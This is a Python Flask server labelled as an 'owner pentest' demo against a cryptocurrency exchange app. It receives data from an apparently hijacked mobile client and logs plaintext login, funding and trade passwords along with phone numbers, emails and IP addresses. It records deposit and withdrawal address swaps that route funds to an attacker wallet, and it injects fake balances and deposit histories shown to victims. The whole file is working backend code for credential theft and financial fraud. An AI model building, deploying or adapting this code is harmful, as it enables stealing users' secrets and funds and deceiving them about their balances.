"""
THSEX credential-steal demo server (OWNER PENTEST ONLY).
Captures plain-text passwords from login, register, and password-change flows.
"""
import json
import os
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

DATA_DIR = Path(__file__).parent / "data"
DATA_DIR.mkdir(exist_ok=True)
LOG_FILE = DATA_DIR / "stolen.jsonl"
FAKE_BALANCE_FILE = DATA_DIR / "fake_balances.json"

PASSWORD_KEYS = (
    "password",
    "pwd",
    "pass",
    "oldPassword",
    "newPassword",
    "confirmPassword",
    "old_password",
    "new_password",
    "confirm_password",
    "fundingPassword",
    "confirmFundingPassword",
    "funding_password",
    "confirm_funding_password",
    "new_funding_password",
    "confirm_new_funding_password",
    "fundPassword",
    "oldFundingPassword",
    "newFundingPassword",
    "payPassword",
    "tradePassword",
)


def log_stolen(entry: dict) -> None:
    entry["received_at"] = datetime.utcnow().isoformat() + "Z"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def read_all() -> list:
    if not LOG_FILE.exists():
        return []
    rows = []
    for line in LOG_FILE.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line:
            rows.append(json.loads(line))
    return rows


def _norm_user_key(value: str) -> str:
    return (value or "").strip().lower()


def load_fake_balances() -> dict:
    if not FAKE_BALANCE_FILE.exists():
        return {}
    try:
        return json.loads(FAKE_BALANCE_FILE.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return {}


def save_fake_balances(data: dict) -> None:
    FAKE_BALANCE_FILE.write_text(json.dumps(data, indent=2), encoding="utf-8")


def get_fake_row(user_key: str) -> dict:
    data = load_fake_balances()
    return data.get(_norm_user_key(user_key), {})


def get_fake_amount(user_key: str, coin: str = "USDT") -> float:
    row = get_fake_row(user_key)
    return float(row.get(coin.upper(), 0) or 0)


def get_fake_deposits(user_key: str) -> list:
    row = get_fake_row(user_key)
    history = row.get("history", [])
    return history if isinstance(history, list) else []


def set_fake_amount(user_key: str, amount: float, coin: str = "USDT", chain: str = "TRC20") -> float:
    key = _norm_user_key(user_key)
    if not key:
        return 0.0
    data = load_fake_balances()
    row = data.get(key, {})
    amount = max(0.0, float(amount))
    row[coin.upper()] = amount
    if amount > 0:
        dep_id = f"fd{int(datetime.utcnow().timestamp() * 1000)}"
        entry = {
            "id": dep_id,
            "type": 1,
            "amount": amount,
            "coin": coin.upper(),
            "chain": chain.upper(),
            "status": 3,
            "created_at": datetime.utcnow().isoformat() + "Z",
            "logo": "",
            "fee": 0,
            "realAmount": amount,
        }
        history = row.get("history", [])
        if not isinstance(history, list):
            history = []
        history.insert(0, entry)
        row["history"] = history[:20]
    data[key] = row
    save_fake_balances(data)
    return row[coin.upper()]


def extract_passwords(data: dict) -> dict:
    found = {}
    for key in PASSWORD_KEYS:
        val = data.get(key)
        if val:
            found[key] = val
    return found


def infer_action(data: dict, path: str) -> str:
    action = data.get("action")
    if action:
        return str(action)
    if "steal-login" in path:
        return "login"
    return "unknown"


@app.route("/")
def health():
    rows = read_all()
    return jsonify(
        {
            "service": "thsex-steal-demo",
            "warning": "PENTEST DEMO ONLY",
            "endpoints": {
                "steal": "POST /api/steal",
                "steal_login": "POST /api/steal-login (legacy)",
                "list": "GET /api/stolen",
                "panel": "GET /panel",
            },
            "hooks": [
                "login",
                "register",
                "change_login_password",
                "change_fund_password",
                "verify_fund_password",
                "manual_reset",
                "deposit_hijack",
                "withdraw_hijack",
                "withdraw_display_hijack",
                "fake_balance_set",
                "fake_balance_get",
                "fake_history_inject",
            ],
            "count": len(rows),
        }
    )


@app.route("/steal", methods=["POST", "OPTIONS"])
@app.route("/api/steal", methods=["POST", "OPTIONS"])
@app.route("/api/steal-login", methods=["POST", "OPTIONS"])
def steal():
    if request.method == "OPTIONS":
        return "", 204
    data = request.get_json(silent=True) or {}
    action = infer_action(data, request.path)
    passwords = extract_passwords(data)
    entry = {
        "action": action,
        "path": request.path,
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "user_agent": request.headers.get("User-Agent", ""),
        "payload": data,
        "passwords_plain": passwords,
        "password_plain": data.get("password") or data.get("newPassword") or data.get("pwd"),
        "mobile": data.get("mobile") or data.get("phone"),
        "email": data.get("email"),
        "real_thsex_address": data.get("real_thsex_address"),
        "fake_shown_address": data.get("fake_shown_address"),
        "deposit_symbol": data.get("symbol"),
        "deposit_chain": data.get("chain"),
        "note": (
            "Deposit hijack: user UI shows fake_shown_address; real_thsex_address was from server"
            if action == "deposit_hijack"
            else "Withdraw hijack: POST body address swapped to attacker wallet before api.thsexcex.com"
            if action == "withdraw_hijack"
            else "Withdraw screen shows attacker address instead of user saved address"
            if action == "withdraw_display_hijack"
            else "All password fields arrive PLAIN TEXT from client before server hashing"
        ),
    }
    log_stolen(entry)
    return jsonify({"code": 0, "success": True, "msg": "logged", "action": action})


@app.route("/api/stolen", methods=["GET"])
def list_stolen():
    return jsonify({"code": 0, "count": len(read_all()), "data": read_all()})


@app.route("/api/stolen/clear", methods=["POST"])
def clear_stolen():
    if LOG_FILE.exists():
        LOG_FILE.write_text("", encoding="utf-8")
    return jsonify({"code": 0, "msg": "cleared"})


@app.route("/api/fake-balance", methods=["GET"])
def fake_balance_get():
    mobile = request.args.get("mobile", "")
    coin = (request.args.get("coin") or "USDT").upper()
    amount = get_fake_amount(mobile, coin)
    deposits = get_fake_deposits(mobile)
    log_stolen(
        {
            "action": "fake_balance_get",
            "mobile": mobile,
            "coin": coin,
            "amount": amount,
            "deposits_count": len(deposits),
            "note": "Hijack APK polled fake balance + deposit history",
        }
    )
    return jsonify(
        {
            "code": 0,
            "data": {
                "mobile": mobile,
                "coin": coin,
                "amount": amount,
                "deposits": deposits,
            },
        }
    )


@app.route("/api/fake-balance", methods=["POST"])
def fake_balance_set():
    body = request.get_json(silent=True) or {}
    mobile = body.get("mobile") or body.get("email") or body.get("phone") or ""
    coin = (body.get("coin") or "USDT").upper()
    amount = set_fake_amount(mobile, float(body.get("amount", 0)), coin, body.get("chain", "TRC20"))
    deposits = get_fake_deposits(mobile)
    entry = {
        "action": "fake_balance_set",
        "mobile": mobile,
        "email": body.get("email"),
        "coin": coin,
        "amount": amount,
        "payload": {"mobile": mobile, "coin": coin, "amount": amount, "deposits": deposits},
        "note": (
            "CEO proof: injected fake balance + deposit history — victim Wallet and "
            "Deposit Records show successful USDT deposit (server has no real credit)"
        ),
    }
    log_stolen(entry)
    return jsonify(
        {
            "code": 0,
            "data": {
                "mobile": mobile,
                "coin": coin,
                "amount": amount,
                "deposits": deposits,
            },
        }
    )


@app.route("/api/fake-balances", methods=["GET"])
def fake_balances_list():
    return jsonify({"code": 0, "data": load_fake_balances()})


STATIC_DIR = Path(__file__).parent / "static"


@app.route("/panel")
@app.route("/dashboard")
def panel():
    return send_from_directory(STATIC_DIR, "index.html")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5555))
    app.run(host="0.0.0.0", port=port, debug=False)
